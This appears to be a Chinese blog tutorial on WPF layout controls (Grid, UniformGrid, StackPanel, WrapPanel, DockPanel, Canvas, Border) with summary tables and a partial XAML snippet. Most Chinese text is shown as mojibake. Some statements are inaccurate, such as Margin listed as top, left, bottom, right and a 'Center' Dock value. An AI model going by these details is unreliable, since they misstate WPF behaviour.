<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99c8c5e8497341cd86f3a12371494dce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=OmX8CgOTiom%2Bvtyq5jdmsncvlz4%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>
<p>åˆ—å®½è®¾ç½®:</p>
<ul>
<li>Width="100"å›ºå®šå®½åº¦</li>
<li>Width="*"æŒ‰æ¯”ä¾‹åˆ†é…å‰©ä½™ç©ºé—´</li>
<li>Width="Auto"æ ¹æ®å†…å®¹è‡ªåŠ¨è°ƒæ•´</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e0ab9a7cf8c4383847d754fed32f9b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=%2FOIbzPUkdxn3rRM%2FITtDpk2TRTY%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-1">Borderæ§ä»¶ä½œä¸ºè£…é¥°å™¨</h5>
<ul>
<li>
<p>å®ç°å®çº¿ç½‘æ ¼:</p>
<ul>
<li>ä¸ºæ¯ä¸ªå•å…ƒæ ¼æ·»åŠ Borderæ§ä»¶</li>
<li>è®¾ç½®BorderThicknessæ§åˆ¶è¾¹æ¡†ç²—ç»†</li>
<li>é€šè¿‡BorderBrushè®¾ç½®é¢œè‰²</li>
</ul>
</li>
</ul>
<h4 data-id="heading-2">çŸ¥è¯†å°ç»“</h4>



























































<table><thead><tr><th>çŸ¥è¯†ç‚¹</th><th>æ ¸å¿ƒå†…å®¹</th><th>å…³é”®å±æ€§/æ˜“æ··æ·†ç‚¹</th><th>åº”ç”¨ç¤ºä¾‹</th></tr></thead><tbody><tr><td>Gridç½‘æ ¼å¸ƒå±€åŸºç¡€</td><td>ç»§æ‰¿è‡ªPanelåŸºç±»ï¼Œç”¨äºå¤šå…ƒç´ æ’ç‰ˆ</td><td>ä¾èµ–å±æ€§ï¼šColumnDefinitions(åˆ—)ã€RowDefinitions(è¡Œ)ã€Grid.ColumnSpan(è·¨åˆ—)ã€Grid.RowSpan(è·¨è¡Œ)</td><td>é€šè¿‡Grid.Column/Rowå®ç°å…ƒç´ è¡Œåˆ—å®šä½</td></tr><tr><td>è¡Œåˆ—å®šä¹‰æ–¹å¼</td><td>é€šè¿‡ColumnDefinitionå’ŒRowDefinitioné›†åˆé…ç½®</td><td>ä¸‹æ ‡ä»0å¼€å§‹ï¼›æ˜Ÿå·è¡¨ç¤ºå‰©ä½™ç©ºé—´åˆ†é…æ¯”ä¾‹ï¼ˆå¦‚5å’Œ10*è¡¨ç¤º1:2æ¯”ä¾‹ï¼‰</td><td>å®šä¹‰ä¸¤åˆ—ï¼š</td></tr><tr><td>è·¨è¡Œåˆ—å¸ƒå±€</td><td>ColumnSpan/RowSpanæ§åˆ¶å…ƒç´ å æ®èŒƒå›´</td><td>è·¨åˆ—éœ€è®¾ç½®èµ·å§‹åˆ—å·ï¼Œè·¨è¡Œéœ€åŒæ­¥è®¾ç½®èµ·å§‹è¡Œå·</td><td>æŒ‰é’®è·¨ä¸¤åˆ—ï¼šGrid.ColumnSpan="2"</td></tr><tr><td>å°ºå¯¸æ§åˆ¶</td><td>å›ºå®šå€¼/è‡ªåŠ¨/Autoä¸‰ç§æ¨¡å¼</td><td>è‡ªåŠ¨æ¨¡å¼è®¡ç®—åŒ…å«å…ƒç´ marginå€¼ï¼›æ˜Ÿå·æ¯”ä¾‹åˆ†é…éœ€æ³¨æ„ä¼˜å…ˆçº§</td><td>è¡Œé«˜100pxï¼š</td></tr><tr><td>è¾…åŠ©çº¿æ˜¾ç¤º</td><td>ShowGridLineså±æ€§æ§åˆ¶è™šçº¿æ˜¾ç¤º</td><td>å®é™…å¼€å‘æ¨èç”¨Borderæ§ä»¶æ¨¡æ‹Ÿå®çº¿ï¼ˆéœ€å¤„ç†é‡å è¾¹æ¡†é—®é¢˜ï¼‰</td><td>éšè—é‡å è¾¹çº¿ï¼šBorderThickness="0,1,1,0"</td></tr><tr><td>è¾¹è·æ§åˆ¶</td><td>Marginå±æ€§ï¼ˆä¸Š,å·¦,ä¸‹,å³ï¼‰å’ŒPaddingå±æ€§</td><td>Marginå½±å“å¸ƒå±€è®¡ç®—ï¼Œä¸Autoé«˜åº¦æ¨¡å¼ä¼šäº§ç”Ÿè”åŠ¨æ•ˆæœ</td><td>ç»Ÿä¸€è¾¹è·ï¼šMargin="20"ï¼Œéå¯¹ç§°è¾¹è·ï¼šMargin="10,5,10,5"</td></tr><tr><td>UniformGridå¯¹æ¯”</td><td>ç®€åŒ–ç‰ˆç½‘æ ¼ï¼ˆåç»­è¯¾ç¨‹ï¼‰</td><td>å…³é”®å·®å¼‚ï¼šGridæ”¯æŒä¸è§„åˆ™å¸ƒå±€ï¼ŒUniformGridå¼ºåˆ¶å‡ç­‰åˆ†å¸ƒ</td><td/></tr><tr><td>å®æˆ˜æŠ€å·§</td><td>Borderæ§ä»¶è£…é¥°ç½‘æ ¼çº¿</td><td>éœ€åµŒå¥—å¸ƒå±€ï¼šGridä½œä¸ºBorderå­å…ƒç´ ï¼Œé€šè¿‡BorderThicknessç²¾ç»†æ§åˆ¶</td><td>å®çº¿å®ç°ï¼š</td></tr></tbody></table>
<h2 data-id="heading-3">UniformGridæ§ä»¶ï¼ˆå‡åˆ†å¸ƒå±€ï¼‰</h2>
<ul>
<li>
<p>åŸºæœ¬æ¦‚å¿µï¼šUniformGridæ§ä»¶æ˜¯ä¸€ç§å‡åˆ†å¸ƒå±€æ§ä»¶ï¼Œä¸Gridæ§ä»¶ç›¸ä¼¼ä½†æ¯ä¸ªå•å…ƒæ ¼é¢ç§¯ç›¸ç­‰</p>
</li>
<li>
<p>å¸ƒå±€ç‰¹ç‚¹ï¼šæ— è®ºæ¨ªå‘è¿˜æ˜¯çºµå‘å•å…ƒæ ¼ï¼Œéƒ½ä¼šè‡ªåŠ¨å¹³åˆ†æ•´ä¸ªUniformGridç©ºé—´</p>
</li>
<li>
<p>æ ¸å¿ƒå±æ€§ï¼š</p>
<ul>
<li>FirstColumnï¼šæ§åˆ¶ç¬¬ä¸€è¡Œéœ€è¦ç©ºå‡ºçš„å•å…ƒæ ¼æ•°ï¼Œé»˜è®¤å€¼ä¸º0</li>
<li>Columnsï¼šå®šä¹‰åˆ—æ•°ï¼Œé»˜è®¤å€¼ä¸º0</li>
<li>Rowsï¼šå®šä¹‰è¡Œæ•°ï¼Œé»˜è®¤å€¼ä¸º0</li>
</ul>
</li>
<li>
<p>ç»§æ‰¿å…³ç³»ï¼šç»§æ‰¿è‡ªPanelåŸºç±»ï¼Œå±äºWPFå¸ƒå±€æ§ä»¶ä½“ç³»</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a555c81911344d4aa9b7754103237658~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=xvSEcGdKmyqGU1tYfbaD3I3zBKg%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>
<p>è¡Œåˆ—æ§åˆ¶ï¼š</p>
<ul>
<li>æ˜ç¡®è®¾ç½®Rows="3" Columns="3"å¯åˆ›å»º3Ã—3ç½‘æ ¼</li>
<li>FirstColumn="1"ä¼šä½¿ç¬¬ä¸€è¡Œç¬¬ä¸€åˆ—ç•™ç©º</li>
<li>ç¤ºä¾‹ä¸­5ä¸ªButtonåœ¨3Ã—3ç½‘æ ¼ä¸­æ’åˆ—ï¼Œç¬¬ä¸€è¡Œç©º1æ ¼åæ’åˆ—</li>
<li/>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30ca80838d034bb3a20fecf06892e18e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=3OIjaUzr7q66jiOFUtSJVQbU6fk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">StackPanelæ§ä»¶ï¼ˆæ ˆå¼å¸ƒå±€ï¼‰</h2>
<ul>
<li>
<p>ç»§æ‰¿å…³ç³»: ç»§æ‰¿è‡ªPanelå¸ƒå±€åŸºç±»ï¼Œå®ç°IScrollInfoå’ŒIStackMeasureæ¥å£</p>
</li>
<li>
<p>æ ¸å¿ƒå±æ€§:</p>
<ul>
<li>Orientation: å†³å®šå­å…ƒç´ æ’åˆ—æ–¹å‘ï¼ˆæ°´å¹³/å‚ç›´ï¼‰</li>
<li>Children: å­å…ƒç´ é›†åˆï¼Œåªèƒ½æŒ‰æŒ‡å®šæ–¹å‘æ’åˆ—</li>
<li>Scrollç›¸å…³: ViewportHeight/Width, ExtentHeight/Widthç­‰æ»šåŠ¨å±æ€§</li>
</ul>
</li>
<li>
<p>å¸ƒå±€ç‰¹æ€§: é€šè¿‡LogicalOrientationæ§åˆ¶é€»è¾‘æ–¹å‘ï¼ŒHasLogicalOrientationåˆ¤æ–­æ˜¯å¦æœ‰æ–¹å‘æ€§</p>
</li>
<li>
<p>æ–¹å‘åˆ‡æ¢: è®¾ç½®Orientation="Horizontal"</p>
</li>
<li>
<p>æº¢å‡ºå¤„ç†: å½“å­å…ƒç´ è¶…å‡ºå®¹å™¨å®½åº¦æ—¶ä¼šè¢«æˆªæ–­</p>
</li>
<li>
<p>æ€§èƒ½ä¼˜åŠ¿: ç›¸æ¯”Gridå¸ƒå±€è®¡ç®—èµ„æºæ¶ˆè€—æ›´å°‘</p>
</li>
<li>
<p>scrollViewer: åŒ…è£¹StackPanelå®ç°æ»šåŠ¨åŠŸèƒ½</p>
</li>
<li>
<p>å®ç°æ­¥éª¤:</p>
<ul>
<li>æ·»åŠ ScrollVieweræ§ä»¶</li>
<li>å°†StackPanelæ”¾å…¥å…¶ä¸­</li>
<li>è®¾ç½®è¶³å¤Ÿå¤šçš„å­å…ƒç´ è§¦å‘æ»šåŠ¨</li>
<li>
<ul>
<li>å¯¹é½å±æ€§: HorizontalAlignmentæ§åˆ¶å­å…ƒç´ æ°´å¹³å¯¹é½</li>
</ul>
</li>
</ul>
</li>
<li>
<p>å››ç§æ¨¡å¼:</p>
<ul>
<li>Left: å·¦å¯¹é½ï¼Œå®½åº¦ç”±å†…å®¹å†³å®š</li>
<li>Right: å³å¯¹é½ï¼Œå®½åº¦ç”±å†…å®¹å†³å®š</li>
<li>Center: å±…ä¸­å¯¹é½</li>
<li>Stretch: é»˜è®¤å€¼ï¼Œæ‹‰ä¼¸å¡«æ»¡å¯ç”¨ç©ºé—´</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/192abd734f0e4af5b8327691f23a641f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=DeB4lPU%2FEL4U2XelIRfpmQffeHA%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fba3060f83194cf497c909d55805f187~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=f3bZUXYE3muX9yXAgd47CTzXdnw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">WrapPanelæ§ä»¶ï¼ˆç€‘å¸ƒæµå¸ƒå±€ï¼‰</h2>
<ul>
<li>
<p>å¸ƒå±€ç‰¹æ€§: ä»¥æµå¼å¸ƒå±€è‡ªåŠ¨æ’åˆ—å­å…ƒç´ ï¼Œå½“ç©ºé—´ä¸è¶³æ—¶ä¼šè‡ªåŠ¨æ¢è¡Œ</p>
</li>
<li>
<p>å¸¸è§ç”¨é€”: é€‚ç”¨äºä¸ç¡®å®šæ˜¾ç¤ºå°ºå¯¸çš„è‡ªé€‚åº”ç•Œé¢è®¾è®¡</p>
</li>
<li>
<p>å¯¹æ¯”ç‰¹æ€§: ä¸StackPanelä¸åŒï¼ŒWrapPanelä¼šæ ¹æ®å®¹å™¨å°ºå¯¸è‡ªåŠ¨è°ƒæ•´å­å…ƒç´ ä½ç½®</p>
</li>
<li>
<ul>
<li>è‡ªé€‚åº”åŸç†: å­å…ƒç´ ä¼šæ ¹æ®å®¹å™¨å®½åº¦/é«˜åº¦è‡ªåŠ¨æ¢è¡Œæ’åˆ—</li>
</ul>
</li>
<li>
<p>å†…å®¹çº¦æŸ: å½“è®¾ç½®ItemHeight=100å’ŒItemWidth=100æ—¶ï¼Œæ‰€æœ‰å­å…ƒç´ éƒ½ä¼šé™åˆ¶åœ¨è¿™ä¸ªå°ºå¯¸èŒƒå›´å†…</p>
</li>
<li>
<p>å¸ƒå±€æ–¹å‘: é»˜è®¤æ°´å¹³æ’åˆ—(ä»å·¦åˆ°å³)ï¼Œæ’æ»¡åè‡ªåŠ¨æ¢è¡Œï¼›ä¹Ÿå¯è®¾ç½®ä¸ºå‚ç›´æ’åˆ—(ä»ä¸Šåˆ°ä¸‹)</p>
</li>
<li>
<p>Orientation:</p>
<ul>
<li>æ§åˆ¶æ’åˆ—æ–¹å‘ï¼ŒHorizontal(æ°´å¹³)æˆ–Vertical(å‚ç›´)</li>
<li>æ°´å¹³æ’åˆ—æ—¶ï¼šä»å·¦åˆ°å³ï¼Œæ’æ»¡æ¢è¡Œ</li>
<li>å‚ç›´æ’åˆ—æ—¶ï¼šä»ä¸Šåˆ°ä¸‹ï¼Œæ’æ»¡æ¢åˆ—</li>
</ul>
</li>
<li>
<p>ItemHeight:</p>
<ul>
<li>ç»Ÿä¸€è®¾ç½®æ‰€æœ‰å­å…ƒç´ çš„é«˜åº¦</li>
<li>ç¤ºä¾‹ä¸­è®¾ç½®ä¸º50æ—¶ï¼Œæ‰€æœ‰æŒ‰é’®é«˜åº¦ç»Ÿä¸€ä¸º50</li>
</ul>
</li>
<li>
<p>ItemWidth:</p>
<ul>
<li>ç»Ÿä¸€è®¾ç½®æ‰€æœ‰å­å…ƒç´ çš„å®½åº¦</li>
<li>ä¸ItemHeighté…åˆä½¿ç”¨å¯å®ç°ç»Ÿä¸€å°ºå¯¸</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a69f98ba1c754d9e82c0c8b7212e57d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=QjrkcM%2FnlTVxNtCfGGbKdUM46Mk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">DockPanelæ§ä»¶ï¼ˆåœé å¸ƒå±€ï¼‰</h2>
<ul>
<li>
<p>åŸºæœ¬ç‰¹æ€§ï¼šä¸StackPanelå’ŒWrapPanelä¸åŒï¼ŒDockPanelé€šè¿‡Dockå±æ€§æ§åˆ¶å­å…ƒç´ çš„åœé ä½ç½®</p>
</li>
<li>
<p>ç»å…¸å¸ƒå±€ï¼š</p>
<ul>
<li>ç¬¬ä¸€ä¸ªå…ƒç´ è®¾ç½®Dock="Left"å°†å·¦é è¾¹åœé </li>
<li>ç¬¬äºŒä¸ªå…ƒç´ è®¾ç½®Dock="Top"å°†åœé é¡¶éƒ¨ï¼ˆå·¦ä¾§ç©ºé—´è¢«ç¬¬ä¸€ä¸ªå…ƒç´ å æ®ï¼‰</li>
<li>ç¬¬ä¸‰ä¸ªå…ƒç´ è®¾ç½®Dock="Right"å°†åœé å³ä¾§ï¼ˆé¡¶éƒ¨éƒ¨åˆ†ç©ºé—´è¢«ç¬¬äºŒä¸ªå…ƒç´ å æ®ï¼‰</li>
<li>ç¬¬å››ä¸ªå…ƒç´ è®¾ç½®Dock="Bottom"å°†åœé åº•éƒ¨</li>
<li>æœ€åä¸€ä¸ªæœªæŒ‡å®šDockå±æ€§çš„å…ƒç´ å°†è‡ªåŠ¨å¡«æ»¡å‰©ä½™ç©ºé—´</li>
</ul>
</li>
<li>
<p>LastChildFillå±æ€§ï¼š</p>
<ul>
<li>é»˜è®¤å€¼ä¸ºTrueï¼Œä½¿æœ€åä¸€ä¸ªå…ƒç´ å¡«æ»¡å‰©ä½™ç©ºé—´</li>
<li>è®¾ç½®ä¸ºFalseæ—¶ï¼Œå‰©ä½™ç©ºé—´ä¸ä¼šè¢«è‡ªåŠ¨å¡«æ»¡ï¼Œå¯ç»§ç»­æ·»åŠ æ–°æ§ä»¶</li>
</ul>
</li>
<li>
<p>æ°´å¹³/å‚ç›´å¸ƒå±€ï¼š</p>
<ul>
<li>é€šè¿‡è®¾ç½®DockPanel.Dock="Center"å¯å®ç°æ°´å¹³æ’åˆ—</li>
<li>å‚ç›´æ’åˆ—æ—¶ä½¿ç”¨Dock="Top"ï¼Œä½†StackPanelæ›´é€‚åˆå¤„ç†è¿™ç±»å¸ƒå±€</li>
<li>å®é™…å¼€å‘ä¸­æ›´æ¨èä½¿ç”¨ç»å…¸çš„å››æ–¹å‘åœé å¸ƒå±€</li>
</ul>
</li>
<li>
<p>å¸ƒå±€ç‰¹ç‚¹ï¼š</p>
<ul>
<li>æ¯ä¸ªåœé æ–¹å‘çš„å…ƒç´ ä¼šå æ®è¯¥æ–¹å‘çš„å…¨éƒ¨å¯ç”¨ç©ºé—´</li>
<li>åç»­åœé çš„å…ƒç´ ä¼šå—åˆ°å…ˆå‰å…ƒç´ å æ®ç©ºé—´çš„å½±å“</li>
<li>å‰©ä½™ç©ºé—´çš„è®¡ç®—æ˜¯åŠ¨æ€çš„ï¼Œå–å†³äºå·²åœé å…ƒç´ çš„ä½ç½®å’Œå¤§å°</li>
<li/>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/157ddd1fcf844ad5af1e0ed0d1f23831~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=b1AHqr0cpAjuOdxiLYbOZAKJwRw%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">äºŒã€çŸ¥è¯†å°ç»“</h4>









































<table><thead><tr><th>çŸ¥è¯†ç‚¹</th><th>æ ¸å¿ƒå†…å®¹</th><th>è€ƒè¯•é‡ç‚¹/æ˜“æ··æ·†ç‚¹</th><th>éš¾åº¦ç³»æ•°</th></tr></thead><tbody><tr><td>åœé å¸ƒå±€ï¼ˆDockPanelï¼‰</td><td>ç”¨äºæ§ä»¶åœé å¸ƒå±€ï¼Œæ”¯æŒä¸Šä¸‹å·¦å³åŠå‰©ä½™ç©ºé—´å¡«å……</td><td>ç»å…¸å¸ƒå±€æ¨¡å¼ï¼ˆä¸Šä¸‹å·¦å³+å‰©ä½™å¡«å……ï¼‰ä¸å±æ€§ä¼˜å…ˆçº§</td><td>â­â­</td></tr><tr><td>Dock å±æ€§</td><td>è®¾ç½®åœé æ–¹å‘ï¼ˆLeft/Top/Right/Bottomï¼‰ï¼Œå½±å“æ§ä»¶å ä½é€»è¾‘</td><td>ç©ºé—´æŠ¢å è§„åˆ™ï¼ˆå…ˆåœé æ§ä»¶ä¼šé™åˆ¶åç»­æ§ä»¶å¯ç”¨ç©ºé—´ï¼‰</td><td>â­â­â­</td></tr><tr><td>LastChildFill å±æ€§</td><td>æ§åˆ¶æœ€åä¸€ä¸ªå­æ§ä»¶æ˜¯å¦å¡«æ»¡å‰©ä½™ç©ºé—´ï¼ˆé»˜è®¤ trueï¼‰</td><td>false æ—¶éœ€æ‰‹åŠ¨è®¡ç®—å‰©ä½™ç©ºé—´åˆ†é…</td><td>â­â­</td></tr><tr><td>å¯¹é½æ–¹å¼</td><td>æ”¯æŒ Center/Top ç­‰å¯¹é½ï¼Œä½†æ¨èç”¨ StackPanel å®ç°</td><td>ä¸ StackPanel çš„å¸ƒå±€å·®å¼‚ï¼ˆDockPanel ä¾§é‡åœé ï¼ŒStackPanel ä¾§é‡çº¿æ€§æ’åˆ—ï¼‰</td><td>â­</td></tr><tr><td>ç»å…¸åº”ç”¨åœºæ™¯</td><td>ä¸Šä¸‹å·¦å³åˆ†æ å¸ƒå±€ï¼ˆå¦‚å·¥å…·æ ã€çŠ¶æ€æ ã€ä¾§è¾¹æ ç»„åˆï¼‰</td><td>ä¼˜å…ˆä½¿ç”¨åœé æ¨¡å¼ï¼Œå¯¹é½æ¨¡å¼æ˜“å¯¼è‡´æ§ä»¶é‡å </td><td>â­â­â­</td></tr></tbody></table>
<h2 data-id="heading-8">####Canvasæ§ä»¶ï¼ˆå›ºå®šå¸ƒå±€ï¼‰</h2>
<h4 data-id="heading-9">ä¸€ã€ç»å¯¹å¸ƒå±€</h4>
<ul>
<li>æ ¸å¿ƒå±æ€§ï¼šæä¾›4ä¸ªä¾èµ–å±æ€§ï¼šLeftPropertyã€TopPropertyã€RightPropertyã€BottomPropertyï¼Œé€šè¿‡é™„åŠ å±æ€§æ–¹å¼è®¾ç½®å­å…ƒç´ ä½ç½®ã€‚</li>
<li>æ–¹æ³•æœºåˆ¶ï¼šé€šè¿‡Get/Setç³»åˆ—æ–¹æ³•ï¼ˆå¦‚GetLeft()ã€SetTop()ï¼‰æ“ä½œè¿™äº›é™„åŠ å±æ€§ï¼Œæ§åˆ¶å­å…ƒç´ ç›¸å¯¹äºCanvasè¾¹ç•Œçš„åƒç´ è·ç¦»ã€‚</li>
<li/>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5f15af82a4f4f7ea35547747e881c0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=IH%2Fy6DJjzfygCd36KuihIBCoM5w%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-10">äºŒã€çŸ¥è¯†å°ç»“</h4>









































<table><thead><tr><th>çŸ¥è¯†ç‚¹</th><th>æ ¸å¿ƒå†…å®¹</th><th>è€ƒè¯•é‡ç‚¹/æ˜“æ··æ·†ç‚¹</th><th>éš¾åº¦ç³»æ•°</th></tr></thead><tbody><tr><td>Canvasç»å¯¹å¸ƒå±€</td><td>WPFä¸­é€šè¿‡åæ ‡å®šä½æ§ä»¶çš„å¸ƒå±€æ–¹å¼</td><td>ä¸DockPanelå¸ƒå±€å±æ€§çš„åŒºåˆ«ï¼ˆæ— Dockå±æ€§ï¼‰</td><td>â­â­</td></tr><tr><td>é™„åŠ å±æ€§</td><td>Left/Top/Right/Bottomå››ä¸ªä¾èµ–å±æ€§æ§åˆ¶ä½ç½®</td><td>æ‹–æ‹½è‡ªåŠ¨ç”Ÿæˆvsæ‰‹åŠ¨è®¾ç½®å±æ€§</td><td>â­â­â­</td></tr><tr><td>å¸ƒå±€ç‰¹æ€§</td><td>å­æ§ä»¶é»˜è®¤å †å åœ¨å·¦ä¸Šè§’ï¼ˆ3åƒç´ è¾¹è·ï¼‰</td><td>å‚ç›´/æ°´å¹³å¯¹é½å±æ€§æ— æ•ˆ</td><td>â­â­</td></tr><tr><td>åæ ‡å®šä½</td><td>é€šè¿‡Canvas.Left=200ç­‰å±æ€§ç²¾ç¡®æ§åˆ¶ä½ç½®</td><td>Right/Bottomä¸Left/Topçš„åæ ‡è®¡ç®—å·®å¼‚</td><td>â­â­â­</td></tr><tr><td>å®ç°åŸç†</td><td>é€šè¿‡DependencyProperty.RegisterAttachedæ³¨å†Œé™„åŠ å±æ€§</td><td>é™„åŠ å±æ€§åœ¨MVVMæ¨¡å¼ä¸­çš„æ‰©å±•åº”ç”¨</td><td>â­â­â­â­</td></tr></tbody></table>
<h2 data-id="heading-11">Borderæ§ä»¶ï¼ˆè¾¹æ¡†å¸ƒå±€)</h2>
<ul>
<li>
<p>æ ¸å¿ƒå±æ€§:</p>
<ul>
<li>BorderThickness: è¾¹æ¡†å®½åº¦</li>
<li>Padding: å†…éƒ¨å…ƒç´ ä¸è¾¹æ¡†çš„è¾¹è·</li>
<li>CornerRadius: åœ†è§’åŠå¾„</li>
<li>BorderBrush: è¾¹æ¡†é¢œè‰²åˆ·å­</li>
<li>Background: èƒŒæ™¯é¢œè‰²</li>
</ul>
</li>
<li>
<p>å°ºå¯¸è®¾ç½®:</p>
<ul>
<li>ç›´æ¥ç»§æ‰¿FrameworkElementçš„Width/Heightå±æ€§</li>
<li>ç¤ºä¾‹ï¼šWidth="100" Height="50"</li>
</ul>
</li>
<li>
<p>å¯¹é½æ–¹å¼:</p>
<ul>
<li>é€šè¿‡HorizontalAlignment/VerticalAlignmentæ§åˆ¶å­å…ƒç´ ä½ç½®</li>
<li>ç¤ºä¾‹ï¼šHorizontalAlignment="Center" VerticalAlignment="Center"</li>
</ul>
</li>
<li>
<p>èƒŒæ™¯è®¾ç½®:</p>
<ul>
<li>é€šè¿‡Backgroundå±æ€§ç›´æ¥è®¾ç½®</li>
<li>ç¤ºä¾‹ï¼šBackground="LightBlue"</li>
</ul>
</li>
<li>
<p>åœ†è§’æ§åˆ¶:</p>
</li>
</ul>

<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-   CornerRadiuså±æ€§æ§åˆ¶å››ä¸ªè§’çš„å¼§åº¦</span>
</code></pre>

<pre><code class="hljs language-ini" lang="ini">-   ç¤ºä¾‹ï¼š<span class="hljs-attr">CornerRadius</span>=<span class="hljs-string">"10"</span>
</code></pre>
<ul>
<li>
<p>ç‰¹æ®Šæ•ˆæœ:</p>
<ul>
<li>
<p>å½“CornerRadiusè®¾ä¸ºé«˜åº¦/å®½åº¦çš„ä¸€åŠæ—¶(å¦‚50)ï¼Œä¼šå½¢æˆæ­£åœ†</p>
</li>
<li>
<p>ç¤ºä¾‹ï¼šHeight="100" CornerRadius="50"ä¼šæ˜¾ç¤ºåœ†å½¢</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5c1c22386294cd091daae09b4dc8da0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=URPQ9DoYvzNIWGu4yKnLL0yQ6F4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cbc2bed652a4b3d99967a17a659d46b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=YZR4AeVkqZSoQVqxjFTmZUy9YCw%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">&lt;<span class="hljs-title class_">Grid</span>&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Grid.RowDefinitions</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">RowDefinition</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"auto"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">RowDefinition</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"*"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">RowDefinition</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"auto"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Grid.RowDefinitions</span>&gt;</span></span>

    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Grid.ColumnDefinitions</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ColumnDefinition</span> <span class="hljs-attr">Width</span>=<span class="hljs-string">"auto"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ColumnDefinition</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Grid.ColumnDefinitions</span>&gt;</span></span>

    &lt;!--top--&gt;
